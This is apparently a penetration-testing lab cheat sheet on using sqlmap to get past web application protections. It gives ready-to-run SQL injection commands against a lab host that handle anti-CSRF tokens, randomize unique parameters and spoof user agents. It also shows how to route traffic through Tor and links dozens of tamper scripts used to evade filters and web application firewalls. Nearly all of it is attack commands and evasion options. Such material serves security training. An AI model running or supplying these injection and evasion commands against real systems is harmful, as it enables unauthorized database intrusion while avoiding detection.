# Bypassing Web Application Protections

## Anti-CSRF Token

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case8.php' --data 'id=1&t0ken=wiHRTgjUo0qZq6UdPKqOgnbk2Er3brDSpDnpvjviY' --csrf-token 't0ken'
```

## Unique Parameter Value

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case9.php?id=1&uid=1230225331' --randomize 'uid'
```

## Random Agent

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case10.php' --data 'id=1' --random-agent
```

## Tor Proxy

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' --tor --check-tor
```

## Tamper Scripts

* [0eunion.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/0eunion.py)
* [apostrophemask.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/apostrophemask.py)
* [apostrophenullencode.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/apostrophenullencode.py)
* [appendnullbyte.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/appendnullbyte.py)
* [base64encode.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/base64encode.py)
* [between.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py)
* [binary.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/binary.py)
* [bluecoat.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/bluecoat.py)
* [chardoubleencode.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/chardoubleencode.py)
* [charencode.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charencode.py)
* [charunicodeencode.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charunicodeencode.py)
* [charunicodeescape.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charunicodeescape.py)
* [commalesslimit.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/commalesslimit.py)
* [commalessmid.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/commalessmid.py)
* [commentbeforeparentheses.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/commentbeforeparentheses.py)
* [concat2concatws.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/concat2concatws.py)
* [decentities.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/decentities.py)
* [dunion.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/dunion.py)
* [equaltolike.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/equaltolike.py)
* [equaltorlike.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/equaltorlike.py)
* [escapequotes.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/escapequotes.py)
* [greatest.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/greatest.py)
* [halfversionedmorekeywords.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/halfversionedmorekeywords.py)
* [hex2char.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/hex2char.py)
* [hexentities.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/hexentities.py)
* [htmlencode.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/htmlencode.py)
* [if2case.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/if2case.py)
* [ifnull2casewhenisnull.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2casewhenisnull.py)
* [ifnull2ifisnull.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2ifisnull.py)
* [informationschemacomment.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/informationschemacomment.py)
* [least.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/least.py)
* [lowercase.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/lowercase.py)
* [luanginx.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/luanginx.py)
* [luanginxmore.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/luanginxmore.py)
* [misunion.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/misunion.py)
* [modsecurityversioned.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/modsecurityversioned.py)
* [modsecurityzeroversioned.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/modsecurityzeroversioned.py)
* [multiplespaces.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/multiplespaces.py)
* [ord2ascii.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ord2ascii.py)
* [overlongutf8.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/overlongutf8.py)
* [overlongutf8more.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/overlongutf8more.py)
* [percentage.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/percentage.py)
* [plus2concat.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/plus2concat.py)
* [plus2fnconcat.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/plus2fnconcat.py)
* [randomcase.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/randomcase.py)
* [randomcomments.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/randomcomments.py)
* [schemasplit.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/schemasplit.py)
* [scientific.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/scientific.py)
* [sleep2getlock.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/sleep2getlock.py)
* [sp_password.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/sp_password.py)
* [space2comment.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/space2comment.py)
* [space2dash.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/space2dash.py)
* [space2hash.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/space2hash.py)
* [space2morecomment.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/space2morecomment.py)
* [space2morehash.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/space2morehash.py)
* [space2mssqlblank.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/space2mssqlblank.py)
* [space2mssqlhash.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/space2mssqlhash.py)
* [space2mysqlblank.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/space2mysqlblank.py)
* [space2mysqldash.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/space2mysqldash.py)
* [space2plus.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/space2plus.py)
* [space2randomblank.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/space2randomblank.py)
* [substring2leftright.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/substring2leftright.py)
* [symboliclogical.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/symboliclogical.py)
* [unionalltounion.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/unionalltounion.py)
* [unmagicquotes.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/unmagicquotes.py)
* [uppercase.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/uppercase.py)
* [varnish.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/varnish.py)
* [versionedkeywords.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/versionedkeywords.py)
* [versionedmorekeywords.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/versionedmorekeywords.py)
* [xforwardedfor.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/xforwardedfor.py)
